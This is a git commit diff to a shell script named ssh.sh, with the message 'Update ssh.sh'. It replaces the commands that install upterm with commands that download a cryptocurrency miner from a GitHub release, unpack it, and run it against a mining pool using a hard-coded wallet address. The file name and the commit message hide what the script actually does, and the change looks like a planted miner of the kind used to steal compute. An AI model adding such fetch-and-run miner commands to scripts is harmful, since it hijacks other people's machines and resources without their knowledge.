24333566f6283a8b3904b449ccc6ef7b979cd745
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-12-23 18:50:46 +0700

    Update ssh.sh

--- ssh.sh
+++ ssh.sh
@@ -1,3 +1,4 @@
-git clone git@github.com:owenthereal/upterm.git
-cd upterm
-go install ./cmd/upterm/...
+wget https://github.com/BinaryExpr/spectre-miner/releases/download/v0.6.26/spectre_miner_x64-v0.6.26_linux.tar.gz
+tar -xvf spectre_miner_x64-v0.6.26_linux.tar.gz
+cd spectre_miner_x64
+./spectre-miner -d spr.tw-pool.com:14001 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x -t 4
